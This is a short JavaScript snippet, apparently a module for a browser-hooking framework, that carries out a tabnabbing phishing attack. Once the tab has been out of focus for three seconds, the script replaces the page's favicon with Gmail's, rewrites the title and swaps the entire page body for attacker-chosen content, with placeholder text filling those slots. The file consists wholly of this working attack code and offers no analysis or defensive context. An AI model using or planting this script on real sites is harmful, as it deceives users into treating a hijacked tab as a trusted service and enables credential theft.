
function(bshell) {

    var self = this;
    self.timer = false;
    self.missionAccomplished = false;

    self.nab = function() {
	self.timer = false;
	self.missionAccomplished = true;


	(function(newIcon, newTitle, newContent) {
	    var link = document.createElement('link');
	    link.type = 'image/x-icon';
	    link.rel = 'shortcut icon';
	    link.href = newIcon;
	    document.getElementsByTagName('head')[0].appendChild(link);
	    var title = document.getElementsByTagName('title');
	    if(title && title[0])
		title = title[0];
	    else {
		title = document.createElement('title');
		document.getElementsByTagName('head')[0].appendChild(title);
	    }
	    title.innerHTML = newTitle;

	    // hide original body and insert new content
	    var bod = document.getElementsByTagName('body')[0];
	    var root = bod.parentNode;
	    root.removeChild(bod);

	    bod = document.createElement('body');
	    bod.innerHTML = newContent;
	    root.appendChild(bod);

	}('//mail.google.com/favicon.ico', 'Title Of A Page', 'The page contents'));
    }

    window.onblur = function() {
	if(!self.missionAccomplished)
	    self.timer = setTimeout(self.nab, 3000);
    }

    window.onfocus = function() {
	if(!self.missionAccomplished)
	    if(self.timer !== false)
		clearTimeout(self.timer);
    }

}(bshell);
